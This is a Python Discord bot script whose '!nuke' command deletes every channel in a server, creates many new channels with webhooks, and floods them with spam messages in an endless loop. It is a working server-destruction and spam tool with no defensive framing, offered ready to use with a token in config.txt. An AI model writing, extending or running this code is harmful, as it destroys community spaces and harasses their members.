import discord
from discord.ext import commands
import asyncio
import aiohttp 

intents = discord.Intents.all()
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

webhook_urls = []

def load_config():
    config = {}
    try:
        with open("config.txt", "r") as f:
            for line in f:
                if "=" in line:
                    key, value = line.strip().split("=", 1)
                    config[key.strip().upper()] = value.strip()
    except FileNotFoundError:
        print("[*] Error config.txt not found")
    return config

@bot.event
async def on_ready():
    print(f" Logged in as {bot.user}")
    bot.loop.create_task(webhook_message_loop())

@bot.command()
async def nuke(ctx):
    config = load_config()
    create_count = int(config.get("CREATE", 5))
    channel_name = config.get("CHANNEL_NAME", "fun-channel")
    webhook_name = config.get("WEBHOOK_NAME", "fun-webhook")
    message = config.get("MESSAGE", "Hello!")

    guild = ctx.guild

    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    async def create_channel_and_webhook(i):
        try:
            channel = await guild.create_text_channel(channel_name)
            webhook = await channel.create_webhook(name=webhook_name)
            webhook_urls.append(webhook.url)
            print(f"[*] Created channel '{channel.name}' and webhook '{webhook.name}'")
        except Exception as e:
            print(f"[*] Error Failed to create webhook for channel {i}: {e}")

    create_tasks = [create_channel_and_webhook(i) for i in range(create_count)]
    await asyncio.gather(*create_tasks, return_exceptions=True)

    async with aiohttp.ClientSession() as session:
        send_tasks = [session.post(url, json={"content": message}) for url in webhook_urls]
        await asyncio.gather(*send_tasks, return_exceptions=True)

async def webhook_message_loop():
    async with aiohttp.ClientSession() as session:
        while True:
            config = load_config()
            message = config.get("MESSAGE", "Hello!")
            try:
                interval = float(config.get("INTERVAL", 1.0))  
            except ValueError:
                interval = 1.0

            for url in webhook_urls:
                try:
                    async with session.post(url, json={"content": message}) as resp:
                        if resp.status != 204:
                            print("[*] Error Failed to send message via webhook")
                except Exception:
                    print("[*] Error Failed to send message via webhook")

            await asyncio.sleep(interval)

config = load_config()
TOKEN = config.get("TOKEN")
if not TOKEN:
    print("[*] Error No TOKEN found in config.txt")
else:
    bot.run(TOKEN)
